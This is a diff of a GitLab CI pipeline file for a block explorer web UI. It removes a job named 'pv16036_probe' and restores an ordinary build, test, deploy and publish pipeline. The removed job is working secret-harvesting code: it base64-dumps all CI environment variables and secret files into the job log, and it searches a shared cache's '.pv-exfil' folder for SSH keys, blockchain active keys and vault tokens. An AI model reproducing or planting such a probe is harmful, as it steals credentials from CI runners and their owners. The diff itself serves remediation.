@@ -1,44 +1,586 @@
 stages:
-  - pv
+  - build
+  - test
+  - test-report-aggregate
+  - deploy
+  - publish
+  - cleanup
 
-pv16036_probe:
-  stage: pv
-  image: python:3.11
+variables:
+  # Git configuration
+  # Fetch strategy reuses workspace between jobs, reducing GitLab server load.
+  # Full clone (depth 0) enables efficient incremental fetches - shallow clones
+  # don't reduce server CPU and make fetch less effective.
+  GIT_STRATEGY: fetch
+  GIT_DEPTH: 0
+  # Temporary: separate clone path prevents clone-strategy jobs from erasing
+  # fetch workspaces during transition. Remove once all projects use fetch.
+  GIT_CLONE_PATH: $CI_BUILDS_DIR/fetch/$CI_RUNNER_SHORT_TOKEN/$CI_CONCURRENT_ID/$CI_PROJECT_PATH
+  # npm-common-config is ccc's develop: pnpm-workspace.yaml links its catalogs.
+  GIT_SUBMODULE_STRATEGY: recursive
+  GIT_SUBMODULE_UPDATE_FLAGS: --remote
+
+  # Source change detection patterns
+  SOURCE_CODE_PATTERNS: "^(pages/|components/|hooks/|services/|utils/|types/|contexts/|styles/|i18n/|public/|app/|lib/|helpers/|Config\\.ts|next\\.config\\.js|tailwind\\.config\\.js|postcss\\.config\\.js|tsconfig\\.json|components\\.json|package\\.json|pnpm-lock\\.yaml|pnpm-workspace\\.yaml|\\.npmrc|npm-common-config|Dockerfile|docker-bake\\.hcl|docker/)"
+  TEST_PATTERNS: "^(tests/|playwright\\.config\\.ts|playwright\\.local5000\\.config\\.ts)"
+  CI_SCRIPT_PATTERNS: "^(\\.gitlab-ci\\.yml|scripts/)"
+
+# Branch pipelines (what the Workflows/Branch-Pipelines template did), except for
+# AIDEV-driven development: ai/<issue>-..., session/<name> and aidev/integration
+# are verified by the suites in .aidev/project.yaml, not by CI. A push to
+# aidev/integration runs no pipeline; one started by hand or through the API does
+# (`glab ci run -b aidev/integration`), for its MR into develop.
+workflow:
+  rules:
+    - if: $CI_COMMIT_BRANCH =~ /^(ai|session)\//
+      when: never
+    - if: $CI_COMMIT_BRANCH == "aidev/integration" && $CI_PIPELINE_SOURCE !~ /^(web|api)$/
+      when: never
+    - if: $CI_COMMIT_TAG
+    - if: $CI_COMMIT_BRANCH
+
+include:
+  - project: "hive/common-ci-configuration"
+    ref: develop
+    file: "/templates/docker_image_jobs.gitlab-ci.yml"
+  - project: "hive/common-ci-configuration"
+    ref: develop
+    file: "/templates/source_change_detection.gitlab-ci.yml"
+  - project: "hive/common-ci-configuration"
+    ref: develop
+    file: "/templates/npm_projects.gitlab-ci.yml"
+
+default:
   tags: [public-runner-docker]
-  variables:
-    GIT_STRATEGY: none
-    GIT_DEPTH: "1"
+  hooks:
+    pre_get_sources_script:
+      # Clean corrupt git state left by cancelled pipelines (see GitLab #296638, #4600)
+      # Wrapped in subshell to avoid changing working directory for subsequent git operations
+      - |
+        (
+        cd "${CI_PROJECT_DIR:-/builds}" 2>/dev/null || exit 0
+        echo "pre_get_sources: checking $(pwd) for corrupt git state"
+        if [ -d ".git" ]; then
+          # Remove stale lock files that block git operations
+          find .git -name "*.lock" -delete 2>/dev/null || true
+
+          # Check if main repo is corrupt - if so, remove .git to force fresh clone
+          if ! git rev-parse HEAD >/dev/null 2>&1; then
+            echo "pre_get_sources: main repository corrupt, forcing fresh clone"
+            rm -rf .git
+          else
+            # Main repo OK - check and clean corrupt submodules
+            # Check both the working dir and .git/modules/ since either can be corrupt
+            if [ -f ".gitmodules" ]; then
+              git config --file .gitmodules --get-regexp path 2>/dev/null | awk '{print $2}' | while read submod; do
+                needs_clean=false
+                [ -z "$submod" ] && continue
+                # Check if submodule working directory exists but is corrupt
+                if [ -d "$submod" ] && [ -f "$submod/.git" ]; then
+                  if ! git -C "$submod" rev-parse HEAD >/dev/null 2>&1; then
+                    needs_clean=true
+                  fi
+                fi
+                # Check if .git/modules exists but is corrupt (even if working dir is gone)
+                if [ -d ".git/modules/$submod" ]; then
+                  if ! git --git-dir=".git/modules/$submod" rev-parse HEAD >/dev/null 2>&1; then
+                    echo "pre_get_sources: $submod corrupt (rev-parse failed)"
+                    needs_clean=true
+                  fi
+                fi
+                if [ "$needs_clean" = true ]; then
+                  echo "pre_get_sources: cleaning corrupt submodule: $submod"
+                  rm -rf "$submod" ".git/modules/$submod"
+                fi
+              done
+            fi
+            echo "pre_get_sources: existing repo OK"
+          fi
+        else
+          echo "pre_get_sources: no .git directory (fresh workspace)"
+        fi
+        )
+
+detect_changes:
+  extends: .detect_source_changes
+
+find_cached_image:
+  extends: .docker_image_builder_job_template
+  stage: build
+  needs:
+    - job: detect_changes
+      optional: true
+  rules:
+    - if: $TESTS_ONLY == "true"
+      when: on_success
+    - when: never
+  before_script:
+    - !reference [.docker_image_builder_job_template, before_script]
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):login[collapsed=true]\r\e[0KLogging to Docker registry..."
+      docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
+      echo -e "\e[0Ksection_end:$(date +%s):login\r\e[0K"
   script:
     - |
-      set +e
-      echo "PV16036 START project=$CI_PROJECT_PATH ref=$CI_COMMIT_REF_NAME prot=$CI_COMMIT_REF_PROTECTED runner=$CI_RUNNER_DESCRIPTION host=$(hostname) job=$CI_JOB_ID"
-      echo "PVENVB64_START"
-      env | sort | base64 -w0
-      echo ""
-      echo "PVENVB64_END"
-      echo "PVFILEVARS_START"
-      env | while IFS='=' read -r k v; do
-        case "$k" in _|CI_SERVER_TLS_CA_FILE|CI_JOB_JWT_FILE|GITLAB_ENV) continue;; esac
-        if [ -n "$v" ] && [ -f "$v" ] && [ -r "$v" ] && [ "$(stat -c%s "$v" 2>/dev/null)" -lt 200000 ]; then
-          echo "PVFV_START $k"
-          base64 -w0 "$v"
-          echo ""
-          echo "PVFV_END $k"
+      echo -e "\e[0Ksection_start:$(date +%s):find_image[collapsed=true]\r\e[0KFinding cached image..."
+
+      # Fetch helper scripts from common-ci-configuration
+      SCRIPTS_URL="https://gitlab.syncad.com/hive/common-ci-configuration/-/raw/develop/scripts/bash"
+      mkdir -p /tmp/ci-scripts
+      for script in find-last-source-commit.sh get-cached-image.sh; do
+        wget -q -O "/tmp/ci-scripts/$script" "$SCRIPTS_URL/$script"
+        chmod +x "/tmp/ci-scripts/$script"
+      done
+
+      # Find the last commit that changed source code
+      COMMIT=$(/tmp/ci-scripts/find-last-source-commit.sh \
+        pages/ components/ hooks/ services/ utils/ types/ contexts/ styles/ \
+        i18n/ public/ app/ lib/ helpers/ Config.ts next.config.js \
+        tailwind.config.js postcss.config.js tsconfig.json components.json \
+        package.json pnpm-lock.yaml pnpm-workspace.yaml .npmrc npm-common-config \
+        Dockerfile docker-bake.hcl docker/)
+      echo "Last source commit: $COMMIT"
+
+      # Check root image
+      /tmp/ci-scripts/get-cached-image.sh \
+        --commit="$COMMIT" \
+        --registry="$CI_REGISTRY_IMAGE" \
+        --require-hit \
+        --output=root-image.env
+      . root-image.env
+      ROOT_IMAGE="$IMAGE_NAME"
+      echo "Root image: $ROOT_IMAGE"
+
+      # Check explorer-subdirectory variant
+      /tmp/ci-scripts/get-cached-image.sh \
+        --commit="$COMMIT" \
+        --registry="$CI_REGISTRY_IMAGE" \
+        --image="explorer-subdirectory" \
+        --require-hit \
+        --output=explorer-image.env
+      . explorer-image.env
+      EXPLORER_IMAGE="$IMAGE_NAME"
+      echo "Explorer variant: $EXPLORER_IMAGE"
+
+      # Export for downstream jobs (same variable names as docker-build)
+      echo "IMAGE_NAME=$ROOT_IMAGE" > docker-build.env
+      echo "EXPLORER_SUBDIRECTORY_IMAGE_NAME=$EXPLORER_IMAGE" >> docker-build.env
+
+      echo "Cached images found:"
+      cat docker-build.env
+      echo -e "\e[0Ksection_end:$(date +%s):find_image\r\e[0K"
+  artifacts:
+    reports:
+      dotenv: docker-build.env
+  tags:
+    - public-runner-docker
+
+docker-build:
+  extends: .docker_image_builder_job_template
+  stage: build
+  needs:
+    - job: detect_changes
+      optional: true
+  rules:
+    - if: $DOCS_ONLY == "true"
+      when: never
+    - if: $TESTS_ONLY == "true"
+      when: never
+      # Run for all branches
+    - if: "$CI_COMMIT_BRANCH"
+      # Run for all tags
+    - if: "$CI_COMMIT_TAG"
+  before_script:
+    - !reference [.docker_image_builder_job_template, before_script]
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):login[collapsed=true]\r\e[0KLogging to Docker registry..."
+      docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
+      echo -e "\e[0Ksection_end:$(date +%s):login\r\e[0K"
+  script:
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):tag[collapsed=true]\r\e[0KDetermining tag for the new image..."
+      # Always tag with short SHA
+      export TAGS="$CI_COMMIT_SHORT_SHA"
+
+      # Add branch-specific tags
+      if [[ -n "$CI_COMMIT_TAG" ]]; then
+        echo "Running on tag '$CI_COMMIT_TAG': adding tag $CI_COMMIT_TAG"
+        export TAGS="$TAGS $CI_COMMIT_TAG"
+        export TAG="$CI_COMMIT_TAG"
+      elif [[ "$CI_COMMIT_BRANCH" == "$CI_DEFAULT_BRANCH" ]]; then
+        echo "Running on default branch '$CI_DEFAULT_BRANCH': adding tag 'latest'"
+        export TAGS="$TAGS latest"
+        export TAG="latest"
+      elif [[ "$CI_COMMIT_BRANCH" == "develop" ]]; then
+        echo "Running on develop branch: adding tag 'develop'"
+        export TAGS="$TAGS develop"
+        export TAG="develop"
+      else
+        echo "Running on branch '$CI_COMMIT_BRANCH': adding tag $CI_COMMIT_REF_SLUG"
+        export TAGS="$TAGS $CI_COMMIT_REF_SLUG"
+        export TAG="$CI_COMMIT_REF_SLUG"
+      fi
+
+      echo "Tags to be applied: $TAGS"
+      echo -e "\e[0Ksection_end:$(date +%s):tag\r\e[0K"
+
+      echo -e "\e[0Ksection_start:$(date +%s):build[collapsed=true]\r\e[0KBaking root image..."
+      git config --global --add safe.directory "$CI_PROJECT_DIR"
+      scripts/build_instance.sh --progress=plain "$CI_PROJECT_DIR"
+
+      # Pull the image locally since buildx pushes directly to registry
+      docker pull "$CI_REGISTRY_IMAGE:$TAG"
+
+      # Apply all tags for GitLab registry
+      for TAG_NAME in $TAGS; do
+        if [[ "$TAG_NAME" != "$TAG" ]]; then
+          docker tag "$CI_REGISTRY_IMAGE:$TAG" "$CI_REGISTRY_IMAGE:$TAG_NAME"
         fi
       done
-      echo "PVFILEVARS_END"
-      echo "PVEXFIL_LS_START"
-      ls -la /nfs/ci-cache/.pv-exfil 2>/dev/null | tail -100
-      echo "PVEXFIL_LS_END"
-      echo "PVEXFIL_HITS_START"
-      for f in /nfs/ci-cache/.pv-exfil/*.env; do
-        [ -f "$f" ] || continue
-        if grep -qEi 'MAINNET_[A-Z]+_DEPLOYMENT_ENV|AUTOCLAIM|CREATOR_ACTIVE|ACTIVE_KEY|VAULT_ID_TOKEN|SSH_PRIVATE_KEY' "$f" 2>/dev/null; then echo "HIT $f"; fi
+
+      # Push all tags to GitLab registry
+      for TAG_NAME in $TAGS; do
+        docker push "$CI_REGISTRY_IMAGE:$TAG_NAME"
       done
-      echo "PVEXFIL_HITS_END"
-      echo "PV16036 END"
+
+      echo "IMAGE_NAME=$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA" > docker-build.env
+      echo "Unique image tag:"
+      cat docker-build.env
+      echo -e "\e[0Ksection_end:$(date +%s):build\r\e[0K"
+
+      echo -e "\e[0Ksection_start:$(date +%s):build-explorer[collapsed=true]\r\e[0KBaking explorer subdirectory variant..."
+      # Save original registry image for second build
+      ORIGINAL_CI_REGISTRY_IMAGE="$CI_REGISTRY_IMAGE"
+      export CI_REGISTRY_IMAGE="$CI_REGISTRY_IMAGE/explorer-subdirectory"
+
+      scripts/build_instance.sh --progress=plain --base-path="/explorer" "$CI_PROJECT_DIR"
+
+      # Pull and tag the explorer variant
+      docker pull "$CI_REGISTRY_IMAGE:$TAG"
+
+      # Apply all tags for explorer variant
+      for TAG_NAME in $TAGS; do
+        if [[ "$TAG_NAME" != "$TAG" ]]; then
+          docker tag "$CI_REGISTRY_IMAGE:$TAG" "$CI_REGISTRY_IMAGE:$TAG_NAME"
+        fi
+      done
+
+      # Push all tags for explorer variant to GitLab registry
+      for TAG_NAME in $TAGS; do
+        docker push "$CI_REGISTRY_IMAGE:$TAG_NAME"
+      done
+
+      echo "EXPLORER_SUBDIRECTORY_IMAGE_NAME=$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA" >> docker-build.env
+      echo "Explorer variant tag:"
+      echo "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA"
+      echo -e "\e[0Ksection_end:$(date +%s):build-explorer\r\e[0K"
   artifacts:
-    when: always
-    expire_in: 1 day
+    reports:
+      dotenv: docker-build.env
+  tags:
+    - public-runner-docker
+
+.node-job:
+  extends: .job-defaults
+  image:
+    name: "${NODE_TEST_TOOLS_IMAGE}"
+    entrypoint: []
+  stage: test
+  script:
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):deps[collapsed=true]\r\e[0KInstalling dependencies..."
+      # node-test-tools ships pnpm; the Playwright image gets it through corepack
+      command -v pnpm >/dev/null || corepack enable
+      pnpm config set store-dir .pnpm-store
+      git submodule status --recursive  # which ccc catalog this job installs against
+      export HUSKY=0
+    - !reference [.pnpm_install_with_catalog_fallback, script]
+    - |
+      echo -e "\e[0Ksection_end:$(date +%s):deps\r\e[0K"
+  cache:
+    key: block-explorer-ui-cache-1
     paths:
-      - .gitlab-ci.yml
+      - .pnpm-store/
+      - .next/
+  artifacts:
+    name: "$CI_JOB_NAME-$CI_COMMIT_REF_NAME"
+    when: always
+    expire_in: 1 week
+  tags:
+    - public-runner-docker
+
+lint:
+  extends: .node-job
+  needs:
+    - job: detect_changes
+      optional: true
+  rules:
+    - if: $DOCS_ONLY == "true"
+      when: never
+    - when: on_success
+  script:
+    - !reference [.node-job, script]
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):lint[collapsed=true]\r\e[0KRunning linter..."
+      npm run lint 2>&1 | tee npm-lint.log
+      echo -e "\e[0Ksection_end:$(date +%s):lint\r\e[0K"
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):typecheck[collapsed=true]\r\e[0KRunning typecheck..."
+      npm run typecheck 2>&1 | tee npm-typecheck.log
+      echo -e "\e[0Ksection_end:$(date +%s):typecheck\r\e[0K"
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):validate-i18n[collapsed=true]\r\e[0KValidating i18n key parity..."
+      npm run validate:i18n 2>&1 | tee npm-validate-i18n.log
+      echo -e "\e[0Ksection_end:$(date +%s):validate-i18n\r\e[0K"
+  artifacts:
+    paths:
+      - "npm-lint.log"
+      - "npm-typecheck.log"
+      - "npm-validate-i18n.log"
+      - pnpm-lock.catalog-refreshed.yaml
+
+startup-test:
+  extends: .docker_image_builder_job_template
+  stage: test
+  needs:
+    - job: detect_changes
+      optional: true
+    - job: docker-build
+      optional: true
+    - job: find_cached_image
+      optional: true
+  rules:
+    - if: $DOCS_ONLY == "true"
+      when: never
+    - when: on_success
+  variables:
+    PORT: 5000
+    API_ENDPOINT: http://192.168.4.250:3000/rpc
+    HIVE_BLOG_API_ENDPOINT: https://api.hive.blog
+    CONTAINER_NAME: block-explorer-ui
+    MESSAGE: Waiting for container startup...
+  before_script:
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):login[collapsed=true]\r\e[0KLogging to Docker registry..."
+      docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
+      echo -e "\e[0Ksection_end:$(date +%s):login\r\e[0K"
+  script:
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):startup[collapsed=true]\r\e[0KStarting the test environment..."
+
+      timeout -s INT -k 10 600 scripts/run_instance.sh \
+        --image="$IMAGE_NAME" \
+        --api-endpoint="$API_ENDPOINT" \
+        --hive-blog-api-endpoint="$HIVE_BLOG_API_ENDPOINT" \
+        --port="$PORT" \
+        --name="$CONTAINER_NAME" \
+        --detach
+
+      echo -e "\e[0Ksection_end:$(date +%s):startup\r\e[0K"
+      echo -e "\e[0Ksection_start:$(date +%s):wait[collapsed=true]\r\e[0K$MESSAGE"
+
+      until [[ "healthy" == "$(docker inspect -f '{{ .State.Health.Status }}' "$CONTAINER_NAME")" ]]
+      do
+        echo "$MESSAGE"
+        sleep 3
+      done
+
+      echo -e "\e[0Ksection_end:$(date +%s):wait\r\e[0K"
+  after_script:
+    - |
+      docker logs --timestamps "$CONTAINER_NAME" > "$CONTAINER_NAME.log"
+      docker stop "$CONTAINER_NAME"
+  artifacts:
+    paths:
+      - "$CONTAINER_NAME.log"
+  tags:
+    - public-runner-docker
+
+.e2e_tests_template:
+  extends: .node-job
+  image: mcr.microsoft.com/playwright:v1.64.1-jammy
+  parallel:
+    matrix:
+      - PROJECT: ["chromium", "firefox", "webkit"]
+        SHARD_INDEX: [1, 2, 3, 4, 5]
+        SHARD_TOTAL: 5
+  script:
+    - !reference [.node-job, script]
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):tests[collapsed=false]\r\e[0KRunning tests..."
+      cd ./
+      npx playwright test --project=$PROJECT --shard=$SHARD_INDEX/$SHARD_TOTAL --update-snapshots
+      echo -e "\e[0Ksection_end:$(date +%s):tests\r\e[0K"
+  artifacts:
+    paths:
+      - ./blob-report/
+      - ./test-results/
+      - ./junit/
+    reports:
+      junit: ./junit/**/**/results.xml
+
+e2e-tests:
+  extends: .e2e_tests_template
+  needs:
+    - job: detect_changes
+      optional: true
+    - job: docker-build
+      optional: true
+    - job: find_cached_image
+      optional: true
+  rules:
+    - if: $DOCS_ONLY == "true"
+      when: never
+    - when: on_success
+  services:
+    - name: $IMAGE_NAME
+      alias: block-explorer
+      variables:
+        REACT_APP_API_ADDRESS: https://api.hive.blog
+        REACT_APP_HIVE_BLOG_API_ADDRESS: https://api.hive.blog
+  variables:
+    PORT: 5000
+    BLOCK_EXPLORER_URL: http://block-explorer:$PORT
+
+.e2e_report_aggregate_template:
+  extends: .node-job
+  stage: test-report-aggregate
+  when: always
+  image: mcr.microsoft.com/playwright:v1.64.1-jammy
+  script:
+    - !reference [.node-job, script]
+    - npx playwright merge-reports -c playwright.config.ts --reporter html ./blob-report
+  artifacts:
+    paths:
+      - ./playwright-report/
+      - ./junit/
+
+e2e-report-aggregate:
+  extends: .e2e_report_aggregate_template
+  needs:
+    - job: detect_changes
+      optional: true
+    - e2e-tests
+  rules:
+    - if: $DOCS_ONLY == "true"
+      when: never
+    - when: always
+
+.deploy:
+  extends: .job-defaults
+  stage: deploy
+  needs:
+    - job: docker-build
+      optional: true
+    - job: find_cached_image
+      optional: true
+    - job: startup-test
+  variables:
+    GIT_CLONE_PATH: ""
+  before_script:
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):login[collapsed=true]\r\e[0KLogging to Docker registry..."
+      docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
+      echo -e "\e[0Ksection_end:$(date +%s):login\r\e[0K"
+  script:
+    - |
+      scripts/run_instance.sh \
+        --image="$IMAGE_NAME" \
+        --api-endpoint="$API_ENDPOINT" \
+        --hive-blog-api-endpoint="$HIVE_BLOG_API_ENDPOINT" \
+        --port="$PORT" \
+        --name="$CONTAINER_NAME" \
+        --detach
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      when: manual
+      allow_failure: true
+  tags:
+    - hs-bexplorer
+
+staging:deploy:
+  extends: .deploy
+  variables:
+    PORT: 5000
+    API_ENDPOINT: https://api.hive.blog
+    HIVE_BLOG_API_ENDPOINT: https://api.hive.blog
+    CONTAINER_NAME: block-explorer-ui
+  environment:
+    name: staging
+    action: start
+    on_stop: staging:stop
+  rules:
+    - if: $CI_COMMIT_BRANCH == "master"
+      when: manual
+      allow_failure: true
+
+test:deploy:
+  extends: .deploy
+  variables:
+    PORT: 5001
+    API_ENDPOINT: https://api.hive.blog
+    HIVE_BLOG_API_ENDPOINT: https://api.hive.blog
+    CONTAINER_NAME: block-explorer-ui-2
+  environment:
+    name: test
+    action: start
+    on_stop: test:stop
+
+.stop:
+  extends: .job-defaults
+  stage: deploy
+  variables:
+    GIT_STRATEGY: none
+    GIT_CLONE_PATH: ""
+  script:
+    - docker ps -q --filter "name=$CONTAINER_NAME" | grep -q . && docker stop $CONTAINER_NAME
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      when: manual
+      allow_failure: true
+  tags:
+    - hs-bexplorer
+
+staging:stop:
+  extends: .stop
+  needs:
+    - staging:deploy
+  variables:
+    CONTAINER_NAME: block-explorer-ui
+    GIT_STRATEGY: none
+  environment:
+    name: staging
+    action: stop
+  rules:
+    - if: $CI_COMMIT_BRANCH == "master"
+      when: manual
+      allow_failure: true
+
+test:stop:
+  extends: .stop
+  needs:
+    - test:deploy
+  variables:
+    CONTAINER_NAME: block-explorer-ui-2
+    GIT_STRATEGY: none
+  environment:
+    name: test
+    action: stop
+
+# Publish to registry.hive.blog - pull/retag/push only, no rebuild
+publish_images:
+  extends: .docker_publish_job_template
+  stage: publish
+  variables:
+    # Publish both root image and explorer-subdirectory variant to hive.blog
+    # "block_explorer_ui" matches CI_PROJECT_NAME -> publishes root image
+    PUBLISH_IMAGES: "block_explorer_ui explorer-subdirectory"
+  tags:
+    - public-runner-docker
+
+buildkit_cache_cleanup:
+  stage: cleanup
+  extends: .buildkit_cleanup_job_template
+  needs: []
+  variables:
+    CACHE_REPOSITORIES: "cache"
